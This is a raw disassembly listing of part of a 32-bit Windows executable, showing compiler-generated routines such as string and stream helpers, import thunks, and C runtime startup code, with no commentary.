  407dd4:	7c 52                	jl     0x407e28
  407dd6:	7f 06                	jg     0x407dde
  407dd8:	83 7d d8 00          	cmpl   $0x0,-0x28(%ebp)
  407ddc:	76 4a                	jbe    0x407e28
  407dde:	8b 06                	mov    (%esi),%eax
  407de0:	8b 48 04             	mov    0x4(%eax),%ecx
  407de3:	8b 55 0c             	mov    0xc(%ebp),%edx
  407de6:	0f b6 02             	movzbl (%edx),%eax
  407de9:	8b 7c 31 38          	mov    0x38(%ecx,%esi,1),%edi
  407ded:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  407df0:	50                   	push   %eax
  407df1:	ff 15 98 a0 40 00    	call   *0x40a098
  407df7:	0f b7 c0             	movzwl %ax,%eax
  407dfa:	50                   	push   %eax
  407dfb:	8b cf                	mov    %edi,%ecx
  407dfd:	ff 15 5c a1 40 00    	call   *0x40a15c
  407e03:	0f b7 c0             	movzwl %ax,%eax
  407e06:	b9 ff ff 00 00       	mov    $0xffff,%ecx
  407e0b:	66 3b c8             	cmp    %ax,%cx
  407e0e:	75 07                	jne    0x407e17
  407e10:	c7 45 ec 04 00 00 00 	movl   $0x4,-0x14(%ebp)
  407e17:	8b 7d d0             	mov    -0x30(%ebp),%edi
  407e1a:	83 c8 ff             	or     $0xffffffff,%eax
  407e1d:	01 45 d8             	add    %eax,-0x28(%ebp)
  407e20:	11 45 dc             	adc    %eax,-0x24(%ebp)
  407e23:	ff 45 0c             	incl   0xc(%ebp)
  407e26:	eb 9b                	jmp    0x407dc3
  407e28:	85 db                	test   %ebx,%ebx
  407e2a:	7c 2c                	jl     0x407e58
  407e2c:	7f 04                	jg     0x407e32
  407e2e:	85 ff                	test   %edi,%edi
  407e30:	74 26                	je     0x407e58
  407e32:	8b 16                	mov    (%esi),%edx
  407e34:	8b 42 04             	mov    0x4(%edx),%eax
  407e37:	0f b7 54 30 40       	movzwl 0x40(%eax,%esi,1),%edx
  407e3c:	8b 4c 30 38          	mov    0x38(%eax,%esi,1),%ecx
  407e40:	52                   	push   %edx
  407e41:	ff 15 5c a1 40 00    	call   *0x40a15c
  407e47:	0f b7 c0             	movzwl %ax,%eax
  407e4a:	b9 ff ff 00 00       	mov    $0xffff,%ecx
  407e4f:	66 3b c8             	cmp    %ax,%cx
  407e52:	75 1c                	jne    0x407e70
  407e54:	83 4d ec 04          	orl    $0x4,-0x14(%ebp)
  407e58:	8b 16                	mov    (%esi),%edx
  407e5a:	8b 42 04             	mov    0x4(%edx),%eax
  407e5d:	33 c9                	xor    %ecx,%ecx
  407e5f:	89 4c 30 20          	mov    %ecx,0x20(%eax,%esi,1)
  407e63:	89 4c 30 24          	mov    %ecx,0x24(%eax,%esi,1)
  407e67:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  407e6e:	eb 2c                	jmp    0x407e9c
  407e70:	83 c7 ff             	add    $0xffffffff,%edi
  407e73:	83 d3 ff             	adc    $0xffffffff,%ebx
  407e76:	eb b0                	jmp    0x407e28
  407e78:	8b 45 08             	mov    0x8(%ebp),%eax
  407e7b:	8b 08                	mov    (%eax),%ecx
  407e7d:	8b 49 04             	mov    0x4(%ecx),%ecx
  407e80:	6a 01                	push   $0x1
  407e82:	6a 04                	push   $0x4
  407e84:	03 c8                	add    %eax,%ecx
  407e86:	ff 15 68 a1 40 00    	call   *0x40a168
  407e8c:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  407e93:	b8 99 7e 40 00       	mov    $0x407e99,%eax
  407e98:	c3                   	ret
  407e99:	8b 75 08             	mov    0x8(%ebp),%esi
  407e9c:	8b 5d c8             	mov    -0x38(%ebp),%ebx
  407e9f:	8b 06                	mov    (%esi),%eax
  407ea1:	8b 55 ec             	mov    -0x14(%ebp),%edx
  407ea4:	8b 48 04             	mov    0x4(%eax),%ecx
  407ea7:	6a 00                	push   $0x0
  407ea9:	52                   	push   %edx
  407eaa:	03 ce                	add    %esi,%ecx
  407eac:	ff 15 68 a1 40 00    	call   *0x40a168
  407eb2:	c7 45 fc 05 00 00 00 	movl   $0x5,-0x4(%ebp)
  407eb9:	ff 15 bc a0 40 00    	call   *0x40a0bc
  407ebf:	84 c0                	test   %al,%al
  407ec1:	75 08                	jne    0x407ecb
  407ec3:	8b cb                	mov    %ebx,%ecx
  407ec5:	ff 15 40 a1 40 00    	call   *0x40a140
  407ecb:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  407ed2:	8b 0b                	mov    (%ebx),%ecx
  407ed4:	8b 51 04             	mov    0x4(%ecx),%edx
  407ed7:	8b 4c 1a 38          	mov    0x38(%edx,%ebx,1),%ecx
  407edb:	85 c9                	test   %ecx,%ecx
  407edd:	74 07                	je     0x407ee6
  407edf:	8b 01                	mov    (%ecx),%eax
  407ee1:	8b 50 08             	mov    0x8(%eax),%edx
  407ee4:	ff d2                	call   *%edx
  407ee6:	8b c6                	mov    %esi,%eax
  407ee8:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  407eeb:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  407ef2:	59                   	pop    %ecx
  407ef3:	5f                   	pop    %edi
  407ef4:	5e                   	pop    %esi
  407ef5:	5b                   	pop    %ebx
  407ef6:	8b e5                	mov    %ebp,%esp
  407ef8:	5d                   	pop    %ebp
  407ef9:	c3                   	ret
  407efa:	cc                   	int3
  407efb:	cc                   	int3
  407efc:	cc                   	int3
  407efd:	cc                   	int3
  407efe:	cc                   	int3
  407eff:	cc                   	int3
  407f00:	55                   	push   %ebp
  407f01:	8b ec                	mov    %esp,%ebp
  407f03:	51                   	push   %ecx
  407f04:	53                   	push   %ebx
  407f05:	56                   	push   %esi
  407f06:	57                   	push   %edi
  407f07:	33 ff                	xor    %edi,%edi
  407f09:	8d 5f 01             	lea    0x1(%edi),%ebx
  407f0c:	8b f1                	mov    %ecx,%esi
  407f0e:	89 7d fc             	mov    %edi,-0x4(%ebp)
  407f11:	e8 3a f3 ff ff       	call   0x407250
  407f16:	89 7e 10             	mov    %edi,0x10(%esi)
  407f19:	33 c9                	xor    %ecx,%ecx
  407f1b:	c7 46 14 07 00 00 00 	movl   $0x7,0x14(%esi)
  407f22:	8b f8                	mov    %eax,%edi
  407f24:	66 89 0e             	mov    %cx,(%esi)
  407f27:	e8 a4 e7 ff ff       	call   0x4066d0
  407f2c:	5f                   	pop    %edi
  407f2d:	8b c6                	mov    %esi,%eax
  407f2f:	5e                   	pop    %esi
  407f30:	5b                   	pop    %ebx
  407f31:	8b e5                	mov    %ebp,%esp
  407f33:	5d                   	pop    %ebp
  407f34:	c3                   	ret
  407f35:	cc                   	int3
  407f36:	cc                   	int3
  407f37:	cc                   	int3
  407f38:	cc                   	int3
  407f39:	cc                   	int3
  407f3a:	cc                   	int3
  407f3b:	cc                   	int3
  407f3c:	cc                   	int3
  407f3d:	cc                   	int3
  407f3e:	cc                   	int3
  407f3f:	cc                   	int3
  407f40:	55                   	push   %ebp
  407f41:	8b ec                	mov    %esp,%ebp
  407f43:	51                   	push   %ecx
  407f44:	56                   	push   %esi
  407f45:	8b f1                	mov    %ecx,%esi
  407f47:	8b c8                	mov    %eax,%ecx
  407f49:	57                   	push   %edi
  407f4a:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  407f51:	8d 79 01             	lea    0x1(%ecx),%edi
  407f54:	8a 11                	mov    (%ecx),%dl
  407f56:	41                   	inc    %ecx
  407f57:	84 d2                	test   %dl,%dl
  407f59:	75 f9                	jne    0x407f54
  407f5b:	2b cf                	sub    %edi,%ecx
  407f5d:	51                   	push   %ecx
  407f5e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407f61:	e8 3a f0 ff ff       	call   0x406fa0
  407f66:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  407f6d:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  407f74:	8b f8                	mov    %eax,%edi
  407f76:	c6 06 00             	movb   $0x0,(%esi)
  407f79:	e8 a2 e2 ff ff       	call   0x406220
  407f7e:	5f                   	pop    %edi
  407f7f:	8b c6                	mov    %esi,%eax
  407f81:	5e                   	pop    %esi
  407f82:	8b e5                	mov    %ebp,%esp
  407f84:	5d                   	pop    %ebp
  407f85:	c3                   	ret
  407f86:	cc                   	int3
  407f87:	cc                   	int3
  407f88:	cc                   	int3
  407f89:	cc                   	int3
  407f8a:	cc                   	int3
  407f8b:	cc                   	int3
  407f8c:	cc                   	int3
  407f8d:	cc                   	int3
  407f8e:	cc                   	int3
  407f8f:	cc                   	int3
  407f90:	55                   	push   %ebp
  407f91:	8b ec                	mov    %esp,%ebp
  407f93:	8b 45 08             	mov    0x8(%ebp),%eax
  407f96:	56                   	push   %esi
  407f97:	50                   	push   %eax
  407f98:	8b f1                	mov    %ecx,%esi
  407f9a:	ff 15 04 a2 40 00    	call   *0x40a204
  407fa0:	c7 06 e4 a8 40 00    	movl   $0x40a8e4,(%esi)
  407fa6:	8b c6                	mov    %esi,%eax
  407fa8:	5e                   	pop    %esi
  407fa9:	5d                   	pop    %ebp
  407faa:	c2 04 00             	ret    $0x4
  407fad:	cc                   	int3
  407fae:	cc                   	int3
  407faf:	cc                   	int3
  407fb0:	55                   	push   %ebp
  407fb1:	8b ec                	mov    %esp,%ebp
  407fb3:	6a ff                	push   $0xffffffff
  407fb5:	68 35 8f 40 00       	push   $0x408f35
  407fba:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  407fc0:	50                   	push   %eax
  407fc1:	53                   	push   %ebx
  407fc2:	56                   	push   %esi
  407fc3:	57                   	push   %edi
  407fc4:	a1 18 e0 40 00       	mov    0x40e018,%eax
  407fc9:	33 c5                	xor    %ebp,%eax
  407fcb:	50                   	push   %eax
  407fcc:	8d 45 f4             	lea    -0xc(%ebp),%eax
  407fcf:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  407fd5:	8b f1                	mov    %ecx,%esi
  407fd7:	8b fa                	mov    %edx,%edi
  407fd9:	33 db                	xor    %ebx,%ebx
  407fdb:	eb 03                	jmp    0x407fe0
  407fdd:	8d 49 00             	lea    0x0(%ecx),%ecx
  407fe0:	3b 7d 08             	cmp    0x8(%ebp),%edi
  407fe3:	74 7f                	je     0x408064
  407fe5:	3b f3                	cmp    %ebx,%esi
  407fe7:	74 70                	je     0x408059
  407fe9:	33 c0                	xor    %eax,%eax
  407feb:	c7 46 14 07 00 00 00 	movl   $0x7,0x14(%esi)
  407ff2:	89 5e 10             	mov    %ebx,0x10(%esi)
  407ff5:	66 89 06             	mov    %ax,(%esi)
  407ff8:	3b f7                	cmp    %edi,%esi
  407ffa:	74 5d                	je     0x408059
  407ffc:	83 7e 14 08          	cmpl   $0x8,0x14(%esi)
  408000:	72 0c                	jb     0x40800e
  408002:	8b 06                	mov    (%esi),%eax
  408004:	50                   	push   %eax
  408005:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  40800b:	83 c4 04             	add    $0x4,%esp
  40800e:	33 c9                	xor    %ecx,%ecx
  408010:	c7 46 14 07 00 00 00 	movl   $0x7,0x14(%esi)
  408017:	89 5e 10             	mov    %ebx,0x10(%esi)
  40801a:	66 89 0e             	mov    %cx,(%esi)
  40801d:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  408021:	73 15                	jae    0x408038
  408023:	8b 47 10             	mov    0x10(%edi),%eax
  408026:	8d 54 00 02          	lea    0x2(%eax,%eax,1),%edx
  40802a:	52                   	push   %edx
  40802b:	57                   	push   %edi
  40802c:	56                   	push   %esi
  40802d:	ff 15 fc a1 40 00    	call   *0x40a1fc
  408033:	83 c4 0c             	add    $0xc,%esp
  408036:	eb 06                	jmp    0x40803e
  408038:	8b 07                	mov    (%edi),%eax
  40803a:	89 06                	mov    %eax,(%esi)
  40803c:	89 1f                	mov    %ebx,(%edi)
  40803e:	8b 4f 10             	mov    0x10(%edi),%ecx
  408041:	89 4e 10             	mov    %ecx,0x10(%esi)
  408044:	8b 57 14             	mov    0x14(%edi),%edx
  408047:	89 56 14             	mov    %edx,0x14(%esi)
  40804a:	33 c0                	xor    %eax,%eax
  40804c:	c7 47 14 07 00 00 00 	movl   $0x7,0x14(%edi)
  408053:	89 5f 10             	mov    %ebx,0x10(%edi)
  408056:	66 89 07             	mov    %ax,(%edi)
  408059:	83 c6 1c             	add    $0x1c,%esi
  40805c:	83 c7 1c             	add    $0x1c,%edi
  40805f:	e9 7c ff ff ff       	jmp    0x407fe0
  408064:	8b c6                	mov    %esi,%eax
  408066:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  408069:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  408070:	59                   	pop    %ecx
  408071:	5f                   	pop    %edi
  408072:	5e                   	pop    %esi
  408073:	5b                   	pop    %ebx
  408074:	8b e5                	mov    %ebp,%esp
  408076:	5d                   	pop    %ebp
  408077:	c3                   	ret
  408078:	8b ff                	mov    %edi,%edi
  40807a:	55                   	push   %ebp
  40807b:	8b ec                	mov    %esp,%ebp
  40807d:	5d                   	pop    %ebp
  40807e:	e9 13 01 00 00       	jmp    0x408196
  408083:	cc                   	int3
  408084:	ff 25 e8 a0 40 00    	jmp    *0x40a0e8
  40808a:	ff 25 ec a0 40 00    	jmp    *0x40a0ec
  408090:	ff 25 f0 a0 40 00    	jmp    *0x40a0f0
  408096:	ff 25 f4 a0 40 00    	jmp    *0x40a0f4
  40809c:	ff 25 f8 a0 40 00    	jmp    *0x40a0f8
  4080a2:	ff 25 fc a0 40 00    	jmp    *0x40a0fc
  4080a8:	ff 25 00 a1 40 00    	jmp    *0x40a100
  4080ae:	ff 25 10 a1 40 00    	jmp    *0x40a110
  4080b4:	ff 25 14 a1 40 00    	jmp    *0x40a114
  4080ba:	8b 49 04             	mov    0x4(%ecx),%ecx
  4080bd:	ff 15 90 a0 40 00    	call   *0x40a090
  4080c3:	85 c0                	test   %eax,%eax
  4080c5:	74 08                	je     0x4080cf
  4080c7:	8b 10                	mov    (%eax),%edx
  4080c9:	6a 01                	push   $0x1
  4080cb:	8b c8                	mov    %eax,%ecx
  4080cd:	ff 12                	call   *(%edx)
  4080cf:	c3                   	ret
  4080d0:	8b ff                	mov    %edi,%edi
  4080d2:	55                   	push   %ebp
  4080d3:	8b ec                	mov    %esp,%ebp
  4080d5:	6a 08                	push   $0x8
  4080d7:	e8 ba 00 00 00       	call   0x408196
  4080dc:	59                   	pop    %ecx
  4080dd:	85 c0                	test   %eax,%eax
  4080df:	74 10                	je     0x4080f1
  4080e1:	8b 0d c0 0c 41 00    	mov    0x410cc0,%ecx
  4080e7:	89 08                	mov    %ecx,(%eax)
  4080e9:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4080ec:	89 48 04             	mov    %ecx,0x4(%eax)
  4080ef:	eb 02                	jmp    0x4080f3
  4080f1:	33 c0                	xor    %eax,%eax
  4080f3:	a3 c0 0c 41 00       	mov    %eax,0x410cc0
  4080f8:	5d                   	pop    %ebp
  4080f9:	c3                   	ret
  4080fa:	6a 04                	push   $0x4
  4080fc:	b8 89 8b 40 00       	mov    $0x408b89,%eax
  408101:	e8 98 04 00 00       	call   0x40859e
  408106:	6a 00                	push   $0x0
  408108:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40810b:	ff 15 24 a1 40 00    	call   *0x40a124
  408111:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  408115:	eb 17                	jmp    0x40812e
  408117:	8b f0                	mov    %eax,%esi
  408119:	8b 00                	mov    (%eax),%eax
  40811b:	8b ce                	mov    %esi,%ecx
  40811d:	a3 c0 0c 41 00       	mov    %eax,0x410cc0
  408122:	e8 93 ff ff ff       	call   0x4080ba
  408127:	56                   	push   %esi
  408128:	e8 63 00 00 00       	call   0x408190
  40812d:	59                   	pop    %ecx
  40812e:	a1 c0 0c 41 00       	mov    0x410cc0,%eax
  408133:	85 c0                	test   %eax,%eax
  408135:	75 e0                	jne    0x408117
  408137:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  40813b:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40813e:	ff 15 28 a1 40 00    	call   *0x40a128
  408144:	e8 88 04 00 00       	call   0x4085d1
  408149:	c3                   	ret
  40814a:	ff 25 70 a1 40 00    	jmp    *0x40a170
  408150:	ff 25 74 a1 40 00    	jmp    *0x40a174
  408156:	ff 25 78 a1 40 00    	jmp    *0x40a178
  40815c:	ff 25 7c a1 40 00    	jmp    *0x40a17c
  408162:	ff 25 80 a1 40 00    	jmp    *0x40a180
  408168:	ff 25 84 a1 40 00    	jmp    *0x40a184
  40816e:	ff 25 b0 a0 40 00    	jmp    *0x40a0b0
  408174:	ff 25 ac a0 40 00    	jmp    *0x40a0ac
  40817a:	ff 25 a8 a0 40 00    	jmp    *0x40a0a8
  408180:	3b 0d 18 e0 40 00    	cmp    0x40e018,%ecx
  408186:	75 02                	jne    0x40818a
  408188:	f3 c3                	repz ret
  40818a:	e9 56 04 00 00       	jmp    0x4085e5
  40818f:	cc                   	int3
  408190:	ff 25 e8 a1 40 00    	jmp    *0x40a1e8
  408196:	ff 25 ec a1 40 00    	jmp    *0x40a1ec
  40819c:	8b ff                	mov    %edi,%edi
  40819e:	55                   	push   %ebp
  40819f:	8b ec                	mov    %esp,%ebp
  4081a1:	f6 45 08 02          	testb  $0x2,0x8(%ebp)
  4081a5:	57                   	push   %edi
  4081a6:	8b f9                	mov    %ecx,%edi
  4081a8:	74 25                	je     0x4081cf
  4081aa:	56                   	push   %esi
  4081ab:	68 1a 8b 40 00       	push   $0x408b1a
  4081b0:	8d 77 fc             	lea    -0x4(%edi),%esi
  4081b3:	ff 36                	push   (%esi)
  4081b5:	6a 0c                	push   $0xc
  4081b7:	57                   	push   %edi
  4081b8:	e8 8c 05 00 00       	call   0x408749
  4081bd:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  4081c1:	74 07                	je     0x4081ca
  4081c3:	56                   	push   %esi
  4081c4:	e8 c7 ff ff ff       	call   0x408190
  4081c9:	59                   	pop    %ecx
  4081ca:	8b c6                	mov    %esi,%eax
  4081cc:	5e                   	pop    %esi
  4081cd:	eb 14                	jmp    0x4081e3
  4081cf:	e8 46 09 00 00       	call   0x408b1a
  4081d4:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  4081d8:	74 07                	je     0x4081e1
  4081da:	57                   	push   %edi
  4081db:	e8 b0 ff ff ff       	call   0x408190
  4081e0:	59                   	pop    %ecx
  4081e1:	8b c7                	mov    %edi,%eax
  4081e3:	5f                   	pop    %edi
  4081e4:	5d                   	pop    %ebp
  4081e5:	c2 04 00             	ret    $0x4
  4081e8:	ff 25 04 a2 40 00    	jmp    *0x40a204
  4081ee:	6a 14                	push   $0x14
  4081f0:	68 40 af 40 00       	push   $0x40af40
  4081f5:	e8 c6 05 00 00       	call   0x4087c0
  4081fa:	ff 35 ac 22 41 00    	push   0x4122ac
  408200:	8b 35 78 a0 40 00    	mov    0x40a078,%esi
  408206:	ff d6                	call   *%esi
  408208:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40820b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40820e:	75 0c                	jne    0x40821c
  408210:	ff 75 08             	push   0x8(%ebp)
  408213:	ff 15 68 a2 40 00    	call   *0x40a268
  408219:	59                   	pop    %ecx
  40821a:	eb 64                	jmp    0x408280
  40821c:	6a 08                	push   $0x8
  40821e:	e8 95 05 00 00       	call   0x4087b8
  408223:	59                   	pop    %ecx
  408224:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  408228:	ff 35 ac 22 41 00    	push   0x4122ac
  40822e:	ff d6                	call   *%esi
  408230:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  408233:	ff 35 a8 22 41 00    	push   0x4122a8
  408239:	ff d6                	call   *%esi
  40823b:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40823e:	8d 45 e0             	lea    -0x20(%ebp),%eax
  408241:	50                   	push   %eax
  408242:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  408245:	50                   	push   %eax
  408246:	ff 75 08             	push   0x8(%ebp)
  408249:	8b 35 7c a0 40 00    	mov    0x40a07c,%esi
  40824f:	ff d6                	call   *%esi
  408251:	50                   	push   %eax
  408252:	e8 5b 05 00 00       	call   0x4087b2
  408257:	83 c4 0c             	add    $0xc,%esp
  40825a:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40825d:	ff 75 e4             	push   -0x1c(%ebp)
  408260:	ff d6                	call   *%esi
  408262:	a3 ac 22 41 00       	mov    %eax,0x4122ac
  408267:	ff 75 e0             	push   -0x20(%ebp)
  40826a:	ff d6                	call   *%esi
  40826c:	a3 a8 22 41 00       	mov    %eax,0x4122a8
  408271:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  408278:	e8 09 00 00 00       	call   0x408286
  40827d:	8b 45 dc             	mov    -0x24(%ebp),%eax
  408280:	e8 80 05 00 00       	call   0x408805
  408285:	c3                   	ret
  408286:	6a 08                	push   $0x8
  408288:	e8 1f 05 00 00       	call   0x4087ac
  40828d:	59                   	pop    %ecx
  40828e:	c3                   	ret
  40828f:	8b ff                	mov    %edi,%edi
  408291:	55                   	push   %ebp
  408292:	8b ec                	mov    %esp,%ebp
  408294:	ff 75 08             	push   0x8(%ebp)
  408297:	e8 52 ff ff ff       	call   0x4081ee
  40829c:	f7 d8                	neg    %eax
  40829e:	1b c0                	sbb    %eax,%eax
  4082a0:	f7 d8                	neg    %eax
  4082a2:	59                   	pop    %ecx
  4082a3:	48                   	dec    %eax
  4082a4:	5d                   	pop    %ebp
  4082a5:	c3                   	ret
  4082a6:	ff 25 4c a2 40 00    	jmp    *0x40a24c
  4082ac:	ff 25 50 a2 40 00    	jmp    *0x40a250
  4082b2:	ff 25 54 a2 40 00    	jmp    *0x40a254
  4082b8:	68 ba 88 40 00       	push   $0x4088ba
  4082bd:	e8 cd ff ff ff       	call   0x40828f
  4082c2:	a1 10 10 41 00       	mov    0x411010,%eax
  4082c7:	c7 04 24 dc 0c 41 00 	movl   $0x410cdc,(%esp)
  4082ce:	ff 35 0c 10 41 00    	push   0x41100c
  4082d4:	a3 dc 0c 41 00       	mov    %eax,0x410cdc
  4082d9:	68 cc 0c 41 00       	push   $0x410ccc
  4082de:	68 d0 0c 41 00       	push   $0x410cd0
  4082e3:	68 c8 0c 41 00       	push   $0x410cc8
  4082e8:	ff 15 e4 a1 40 00    	call   *0x40a1e4
  4082ee:	83 c4 14             	add    $0x14,%esp
  4082f1:	a3 d8 0c 41 00       	mov    %eax,0x410cd8
  4082f6:	85 c0                	test   %eax,%eax
  4082f8:	79 08                	jns    0x408302
  4082fa:	6a 08                	push   $0x8
  4082fc:	e8 8d 05 00 00       	call   0x40888e
  408301:	59                   	pop    %ecx
  408302:	c3                   	ret
  408303:	6a 5c                	push   $0x5c
  408305:	68 60 af 40 00       	push   $0x40af60
  40830a:	e8 b1 04 00 00       	call   0x4087c0
  40830f:	33 db                	xor    %ebx,%ebx
  408311:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  408314:	8d 45 94             	lea    -0x6c(%ebp),%eax
  408317:	50                   	push   %eax
  408318:	ff 15 68 a0 40 00    	call   *0x40a068
  40831e:	39 1d a0 22 41 00    	cmp    %ebx,0x4122a0
  408324:	75 0b                	jne    0x408331
  408326:	53                   	push   %ebx
  408327:	53                   	push   %ebx
  408328:	6a 01                	push   $0x1
  40832a:	53                   	push   %ebx
  40832b:	ff 15 6c a0 40 00    	call   *0x40a06c
  408331:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  408334:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
  40833a:	8b 70 04             	mov    0x4(%eax),%esi
  40833d:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  408340:	bf 9c 22 41 00       	mov    $0x41229c,%edi
  408345:	53                   	push   %ebx
  408346:	56                   	push   %esi
  408347:	57                   	push   %edi
  408348:	ff 15 70 a0 40 00    	call   *0x40a070
  40834e:	3b c3                	cmp    %ebx,%eax
  408350:	74 19                	je     0x40836b
  408352:	3b c6                	cmp    %esi,%eax
  408354:	75 08                	jne    0x40835e
  408356:	33 f6                	xor    %esi,%esi
  408358:	46                   	inc    %esi
  408359:	89 75 e0             	mov    %esi,-0x20(%ebp)
  40835c:	eb 10                	jmp    0x40836e
  40835e:	68 e8 03 00 00       	push   $0x3e8
  408363:	ff 15 18 a0 40 00    	call   *0x40a018
  408369:	eb da                	jmp    0x408345
  40836b:	33 f6                	xor    %esi,%esi
  40836d:	46                   	inc    %esi
  40836e:	a1 98 22 41 00       	mov    0x412298,%eax
  408373:	3b c6                	cmp    %esi,%eax
  408375:	75 0a                	jne    0x408381
  408377:	6a 1f                	push   $0x1f
  408379:	e8 10 05 00 00       	call   0x40888e
  40837e:	59                   	pop    %ecx
  40837f:	eb 3b                	jmp    0x4083bc
  408381:	a1 98 22 41 00       	mov    0x412298,%eax
  408386:	85 c0                	test   %eax,%eax
  408388:	75 2c                	jne    0x4083b6
  40838a:	89 35 98 22 41 00    	mov    %esi,0x412298
  408390:	68 30 a3 40 00       	push   $0x40a330
  408395:	68 24 a3 40 00       	push   $0x40a324
  40839a:	e8 a3 06 00 00       	call   0x408a42
  40839f:	59                   	pop    %ecx
  4083a0:	59                   	pop    %ecx
  4083a1:	85 c0                	test   %eax,%eax
  4083a3:	74 17                	je     0x4083bc
  4083a5:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4083ac:	b8 ff 00 00 00       	mov    $0xff,%eax
  4083b1:	e9 18 01 00 00       	jmp    0x4084ce
  4083b6:	89 35 e4 0c 41 00    	mov    %esi,0x410ce4
  4083bc:	a1 98 22 41 00       	mov    0x412298,%eax
  4083c1:	3b c6                	cmp    %esi,%eax
  4083c3:	75 1b                	jne    0x4083e0
  4083c5:	68 20 a3 40 00       	push   $0x40a320
  4083ca:	68 04 a3 40 00       	push   $0x40a304
  4083cf:	e8 68 06 00 00       	call   0x408a3c
  4083d4:	59                   	pop    %ecx
  4083d5:	59                   	pop    %ecx
  4083d6:	c7 05 98 22 41 00 02 	movl   $0x2,0x412298
  4083dd:	00 00 00 
  4083e0:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4083e3:	75 08                	jne    0x4083ed
  4083e5:	53                   	push   %ebx
  4083e6:	57                   	push   %edi
  4083e7:	ff 15 74 a0 40 00    	call   *0x40a074
  4083ed:	39 1d a4 22 41 00    	cmp    %ebx,0x4122a4
  4083f3:	74 19                	je     0x40840e
  4083f5:	68 a4 22 41 00       	push   $0x4122a4
  4083fa:	e8 81 05 00 00       	call   0x408980
  4083ff:	59                   	pop    %ecx
  408400:	85 c0                	test   %eax,%eax
  408402:	74 0a                	je     0x40840e
  408404:	53                   	push   %ebx
  408405:	6a 02                	push   $0x2
  408407:	53                   	push   %ebx
  408408:	ff 15 a4 22 41 00    	call   *0x4122a4
  40840e:	a1 d0 a1 40 00       	mov    0x40a1d0,%eax
  408413:	8b 00                	mov    (%eax),%eax
  408415:	89 45 dc             	mov    %eax,-0x24(%ebp)
  408418:	0f b7 08             	movzwl (%eax),%ecx
  40841b:	83 f9 20             	cmp    $0x20,%ecx
  40841e:	77 4f                	ja     0x40846f
  408420:	66 3b cb             	cmp    %bx,%cx
  408423:	74 05                	je     0x40842a
  408425:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  408428:	75 45                	jne    0x40846f
  40842a:	0f b7 08             	movzwl (%eax),%ecx
  40842d:	66 3b cb             	cmp    %bx,%cx
  408430:	74 0d                	je     0x40843f
  408432:	83 f9 20             	cmp    $0x20,%ecx
  408435:	77 08                	ja     0x40843f
  408437:	83 c0 02             	add    $0x2,%eax
  40843a:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40843d:	eb eb                	jmp    0x40842a
  40843f:	f6 45 c0 01          	testb  $0x1,-0x40(%ebp)
  408443:	74 06                	je     0x40844b
  408445:	0f b7 4d c4          	movzwl -0x3c(%ebp),%ecx
  408449:	eb 03                	jmp    0x40844e
  40844b:	6a 0a                	push   $0xa
  40844d:	59                   	pop    %ecx
  40844e:	51                   	push   %ecx
  40844f:	50                   	push   %eax
  408450:	53                   	push   %ebx
  408451:	68 00 00 40 00       	push   $0x400000
  408456:	e8 25 c5 ff ff       	call   0x404980
  40845b:	a3 e0 0c 41 00       	mov    %eax,0x410ce0
  408460:	39 1d d4 0c 41 00    	cmp    %ebx,0x410cd4
  408466:	75 4c                	jne    0x4084b4
  408468:	50                   	push   %eax
  408469:	ff 15 d4 a1 40 00    	call   *0x40a1d4
  40846f:	83 f9 22             	cmp    $0x22,%ecx
  408472:	75 0b                	jne    0x40847f
  408474:	33 c9                	xor    %ecx,%ecx
  408476:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  408479:	0f 94 c1             	sete   %cl
  40847c:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  40847f:	83 c0 02             	add    $0x2,%eax
  408482:	eb 91                	jmp    0x408415
  408484:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408487:	8b 08                	mov    (%eax),%ecx
  408489:	8b 09                	mov    (%ecx),%ecx
  40848b:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  40848e:	50                   	push   %eax
  40848f:	51                   	push   %ecx
  408490:	e8 4b 04 00 00       	call   0x4088e0
  408495:	59                   	pop    %ecx
  408496:	59                   	pop    %ecx
  408497:	c3                   	ret
  408498:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40849b:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40849e:	a3 e0 0c 41 00       	mov    %eax,0x410ce0
  4084a3:	33 db                	xor    %ebx,%ebx
